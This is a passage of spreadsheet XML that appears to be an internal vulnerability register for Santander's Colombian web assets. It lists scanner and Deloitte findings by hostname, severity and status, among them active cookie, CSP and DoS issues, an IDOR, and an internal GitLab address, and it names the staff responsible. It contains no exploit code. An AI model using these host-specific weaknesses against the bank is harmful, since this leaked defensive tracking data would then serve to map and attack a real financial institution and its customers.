    <s v="Active"/>
    <x v="2"/>
    <s v="3.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/README.md"/>
    <m/>
    <m/>
    <d v="2025-05-27T00:00:00"/>
    <n v="392"/>
    <d v="2025-09-24T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha detectado un fichero_x000a_https://www.santander.com.co/README.md en el que se muestra cierta información destinada_x000a_a desarrolladores, y entre la que se incluyen referencias a un servidor de GitLab interno en_x000a_http://gitlabsnc.cosanpre.corp:8080: "/>
    <s v="Se recomienda eliminar el fichero https://www.santander.com.co/README.md, ya que es este_x000a_fichero el que expone la información interna descrita en esta vulnerabilidad."/>
    <s v="Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento_x000a_interno del sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red_x000a_interna."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="359"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <m/>
    <x v="175"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-12-20T00:00:00"/>
    <n v="550"/>
    <d v="2025-04-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Potentially insecure policy"/>
    <s v="(An insecure CSP configuration was detected.) The Content Security Policy is not effective at meeting the security objectives defined for preventing Cross Site Scripting attacks, such as:_x000a__x000a_Preventing loading of unauthorized content resources and scripts._x000a_Preventing clickjacking and other nested frame attacks._x000a_Ensuring that web forms and links are behaving as intended._x000a_- To improve your configuration, make sure to:_x000a__x000a_Implement directives that set valid and complete source restrictions for loading dynamic content ('script-src', 'object-src', 'default-src')._x000a_Avoid the use of unsafe directives such as ‘unsafe-eval’ and ‘unsafe-inline’._x000a_Avoid typos or otherwise invalid CSP directives._x000a_Avoid wildcards, host-based allowlists, or bare URL schemes such as ‘HTTP’ in source directives._x000a_Use specific sources, such as &quot;https://www.example.com&quot;. Remove generalizations, such as &quot;http:&quot;, &quot;https:&quot;, &quot;https://*.com&quot;.See Content Security Policy Configurations for more information."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="360"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <m/>
    <x v="176"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-04-11T00:00:00"/>
    <n v="438"/>
    <d v="2025-08-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Resource blocked by Content Security Policy (CSP)"/>
    <s v="(Resource blocked by Content Security Policy (CSP)) The page attempted to load a resource that was blocked by the CSP policy. The presence of such error suggests that:_x000a__x000a_The website content and security policies are incongruent._x000a_The website unknowingly includes third-party content._x000a_Malicious code is injected into the website but blocked by the CSP._x000a_- Review the website for CSP violation messages. Detailed information about the existing violations is available in the evidence details section and you may be able to find them on your browser of choice, on developer tools, under the Console tab. See Content Security Policy Violations for more information."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="361"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-7f652953-dfb9-450d-a991-2178df69d483"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <s v="7.6"/>
    <m/>
    <m/>
    <s v="waf.api.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un enlace es accesible a través de una conexión insegura, es decir, HTTP."/>
    <s v="Asegúrese de que el sitio web de destino sea accesible solo a través de HTTPS. Si se reciben solicitudes no HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen solo HTTPS al realizar solicitudes al servidor."/>
    <s v="Los atacantes que intentan robar credenciales de inicio de sesión, IDs de sesión u otra información sensible. Bypaseando SSL ingresando HTTP en lugar de HTTPS. Enviando URLs inseguras de páginas protegidas a la víctima (por ejemplo, página de login) para engañar a la víctima y hacer que acceda a las páginas privilegiadas a través de HTTP."/>
    <d v="2025-07-09T00:00:00"/>
    <s v="Descargadas como falso positivo"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="362"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-775ac617-f069-4c25-9e89-3ae97c19271d"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <s v="7.6"/>
    <m/>
    <m/>
    <s v="waf.api.dev.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un enlace es accesible a través de una conexión insegura, es decir, HTTP."/>
    <s v="Asegúrese de que el sitio web de destino sea accesible solo a través de HTTPS. Si se reciben solicitudes no HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen solo HTTPS al realizar solicitudes al servidor."/>
    <s v="Los atacantes que intentan robar credenciales de inicio de sesión, IDs de sesión u otra información sensible. Bypaseando SSL ingresando HTTP en lugar de HTTPS. Enviando URLs inseguras de páginas protegidas a la víctima (por ejemplo, página de login) para engañar a la víctima y hacer que acceda a las páginas privilegiadas a través de HTTP."/>
    <d v="2025-07-09T00:00:00"/>
    <s v="Descargadas como falso positivo"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="363"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-a5b4a20b-2c92-4ac8-a002-c9a7a5a5008c"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <s v="7.6"/>
    <m/>
    <m/>
    <s v="waf.api.ocu.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un enlace es accesible a través de una conexión insegura, es decir, HTTP."/>
    <s v="Asegúrese de que el sitio web de destino sea accesible solo a través de HTTPS. Si se reciben solicitudes no HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen solo HTTPS al realizar solicitudes al servidor."/>
    <s v="Los atacantes que intentan robar credenciales de inicio de sesión, IDs de sesión u otra información sensible. Bypaseando SSL ingresando HTTP en lugar de HTTPS. Enviando URLs inseguras de páginas protegidas a la víctima (por ejemplo, página de login) para engañar a la víctima y hacer que acceda a las páginas privilegiadas a través de HTTP."/>
    <d v="2025-07-09T00:00:00"/>
    <s v="Descargadas como falso positivo"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="364"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-fb427064-eaac-4bd4-8073-8d5c17e07800"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <s v="7.6"/>
    <m/>
    <m/>
    <s v="waf.api.qa.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un enlace es accesible a través de una conexión insegura, es decir, HTTP."/>
    <s v="Asegúrese de que el sitio web de destino sea accesible solo a través de HTTPS. Si se reciben solicitudes no HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen solo HTTPS al realizar solicitudes al servidor."/>
    <s v="Los atacantes que intentan robar credenciales de inicio de sesión, IDs de sesión u otra información sensible. Bypaseando SSL ingresando HTTP en lugar de HTTPS. Enviando URLs inseguras de páginas protegidas a la víctima (por ejemplo, página de login) para engañar a la víctima y hacer que acceda a las páginas privilegiadas a través de HTTP."/>
    <d v="2025-07-09T00:00:00"/>
    <s v="Descargadas como falso positivo"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="365"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-ccd9d8b1-050f-4282-9dbd-5ba72c503cbb"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Dismissed"/>
    <x v="4"/>
    <s v="7.6"/>
    <m/>
    <m/>
    <s v="waf.api.stg.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-14T00:00:00"/>
    <n v="374"/>
    <d v="2025-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un enlace es accesible a través de una conexión insegura, es decir, HTTP."/>
    <s v="Asegúrese de que el sitio web de destino sea accesible solo a través de HTTPS. Si se reciben solicitudes no HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen solo HTTPS al realizar solicitudes al servidor."/>
    <s v="Los atacantes que intentan robar credenciales de inicio de sesión, IDs de sesión u otra información sensible. Bypaseando SSL ingresando HTTP en lugar de HTTPS. Enviando URLs inseguras de páginas protegidas a la víctima (por ejemplo, página de login) para engañar a la víctima y hacer que acceda a las páginas privilegiadas a través de HTTP."/>
    <d v="2025-07-09T00:00:00"/>
    <s v="Descargadas como falso positivo"/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="366"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-68527f176c975521ca3b900e"/>
    <s v="SC-25-CNMPA-004-VE-001"/>
    <x v="178"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="vpnco1.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-18T00:00:00"/>
    <n v="370"/>
    <d v="2025-09-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que es posible degradar el rendimiento de la aplicación y el servidor remoto que la sustenta. Pudiendo llegar a realizar una denegación de servicio de la infraestructura e impidiendo que la aplicación pueda prestar servicio a los usuarios legítimos de la aplicación. "/>
    <s v="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
    <s v="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
    <s v="Sin definir"/>
    <m/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="367"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-68527f176c975521ca3b900f"/>
    <s v="SC-25-CNMPA-004-VE-002"/>
    <x v="178"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="vpnco2.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-18T00:00:00"/>
    <n v="370"/>
    <d v="2025-09-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que es posible degradar el rendimiento de la aplicación y el servidor remoto que la sustenta. Pudiendo llegar a realizar una denegación de servicio de la infraestructura e impidiendo que la aplicación pueda prestar servicio a los usuarios legítimos de la aplicación. "/>
    <s v="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
    <s v="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
    <s v="Sin definir"/>
    <m/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="368"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-58aa7e6f-af2d-4e5c-b3d0-b96eef280924"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La Cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="369"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-83622d31-f369-4ec0-8249-e91842d59275"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La Cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="370"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-91e1b24f-bb4c-4a75-a257-68ed7a1e7104"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La Cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="371"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-aaeaa952-a1e5-4917-9a3e-f47d3cc53586"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La Cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="372"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-bc6901c6-6f2b-4757-a838-b4f4fbadce58"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La Cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="373"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-14fc1bec-b648-4145-9683-952600d6ce0a"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &quot;seguro&quot; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="374"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-28e138a7-0664-4306-87b5-1ee1724e4a94"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &quot;seguro&quot; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="375"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-39608b13-7d68-4586-936f-0dd0b1efa2d0"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &quot;seguro&quot; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="376"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-c391a6a6-2d87-4361-ad1c-95a3a4b734cc"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2025-04-18T00:00:00"/>
    <n v="431"/>
    <d v="2025-07-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &quot;seguro&quot; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="377"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-87c5919d-0c1e-4c93-a26f-8bcffa3c5aba"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/rb_bf10849rjg?type=js3&amp;sn=v_4_srv_1_sn_E34D61E9BF330463E52FC0DA8D8BD3BF_perc_100000_ol_0_mul_1_app-3A0e06b2b0e5f9e5f4_1&amp;svrid=1&amp;flavor=post&amp;vi=GUUSGWRWAHICWGWGNGMQWBLDRGUEAJFF-0&amp;modifiedSince=1749002768910&amp;bp=3&amp;app=0e06b2b0e5f9e5f4&amp;crc=2362357479&amp;en=flo1gyf2&amp;end=1"/>
    <m/>
    <m/>
    <d v="2025-06-06T00:00:00"/>
    <n v="382"/>
    <d v="2025-09-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede ser enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles."/>
    <s v="Los mecanismos comunes de prevención de clickjacking incluyen:X-Frame-Options: Este es un encabezado de respuesta HTTP que se utiliza para prevenir el enmarcamiento de la página web.Código JavaScript Framekiller: Se puede utilizar un código JS especial para prevenir que un usuario malintencionado enmarque la página. Este método es menos confiable que el uso de X-Frame-Options."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="378"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="QA-WAS-ae5ea8b4-9a41-4c6b-91d2-5e16d298a80b"/>
    <m/>
    <x v="163"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/icons/small/"/>
    <m/>
    <m/>
    <d v="2025-05-30T00:00:00"/>
    <n v="389"/>
    <d v="2025-08-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor web presenta una lista de directorios."/>
    <s v="La presencia de un directorio navegable no implica necesariamente una vulnerabilidad. Determine si la lista del directorio está destinada a ser mostrada. Verifique que ningún archivo en el directorio contenga contenido que no deba ser servido por la aplicación web."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="379"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-8911e6bb-832d-4a7f-9c6a-331a8503322d"/>
    <m/>
    <x v="164"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.4"/>
    <m/>
    <m/>
    <s v="https://portalrecaudos.santander.com.co/#/"/>
    <m/>
    <m/>
    <d v="2024-12-09T00:00:00"/>
    <n v="561"/>
    <d v="2025-03-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Bootstrap es un marco CSS gratuito y de código abierto dirigido al desarrollo web responsivo. Contiene plantillas de diseño basadas en HTML, CSS y JavaScript para tipografía, formularios, botones, navegación y otros componentes de la interfaz.La aplicación web está utilizando una biblioteca de JavaScript que se sabe que contiene al menos una vulnerabilidad."/>
    <s v="Por favor, consulte la información proporcionada en la sección de respuestas. También verifique los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="380"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <s v="QA-WAS-53d76729-7897-4c91-993e-34482c0c10a6"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co/san"/>
    <m/>
    <m/>
    <d v="2025-05-17T00:00:00"/>
    <n v="402"/>
    <d v="2025-08-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="381"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <s v="QA-WAS-3f999e8b-05ed-497f-b65a-0d3a834db4b1"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co/san"/>
    <m/>
    <m/>
    <d v="2025-05-17T00:00:00"/>
    <n v="402"/>
    <d v="2025-08-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo &amp;quot;seguro&amp;quot;."/>
    <s v="Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &quot;seguro&quot; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="382"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="QA-WAS-baacfa44-b66c-4682-8f78-1f5ba0bc63ba"/>
    <m/>
    <x v="123"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="4.7"/>
    <m/>
    <m/>
    <s v="https://vpnco1.santander.com.co/+CSCOE+/message.html?mc=2"/>
    <m/>
    <m/>
    <d v="2024-08-23T00:00:00"/>
    <n v="669"/>
    <d v="2024-11-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un archivo, un directorio o una lista de directorios potencialmente confidenciales en el servidor web."/>
    <s v="Verifique que se permita el acceso a este archivo o directorio. Si es necesario, elimínelo o aplique controles de acceso a él."/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Angie Cubillos"/>
  </r>
  <r>
    <n v="383"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862770e6c975521ca41b5ab"/>
    <s v="SC-25-CNMPO-007-AP-001"/>
    <x v="142"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="www.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-06-24T00:00:00"/>
    <n v="364"/>
    <d v="2025-07-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para  recuperar un objeto sin realizar suficientes comprobaciones de autorización."/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada. Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el usuario antes de su envío al servidor."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto, en este caso, la cédula de cualquier cliente. Dichos recursos pueden ser registros, entradas de basesde datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación."/>
    <s v="Sin definir"/>
